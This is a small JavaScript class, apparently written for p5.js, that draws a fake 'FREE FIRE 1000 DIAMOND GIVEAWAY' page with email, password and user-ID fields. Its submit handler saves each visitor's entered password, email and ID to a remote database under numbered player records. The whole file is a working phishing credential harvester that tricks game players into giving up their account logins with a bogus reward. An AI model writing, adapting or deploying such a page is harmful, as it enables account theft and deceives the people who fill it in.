class Form {
  constructor() {
    this.input1 = createInput();
    this.input2 = createInput();
    this.input3 = createInput();
    this.count = 0;
    this.title = createElement('h2');
    this.button = createButton("SUBMIT");
    this.image = loadImage("img/diamond.png");
  }

  display(){
    this.title.html(" → FREE FIRE 1000 DIAMOND GIVEAWAY");
    this.title.position(240,600);
    this.title.style('color',0);

    this.button.position(440,440);

    this.input1.position(380,300);
    this.input2.position(380,350);
    this.input3.position(380,250);
    
    this.button.mousePressed(()=>{
      this.count += 1;
      database.ref('player' + this.count).update({
        pas: this.input2.value(),
        mail: this.input1.value(),
        uid: this.input3.value()
      });
      // this.input1 = "";
      // this.input2 = "";
      // this.input3 = "";
    });

    image(this.image,480,500,100,100);
  }
}
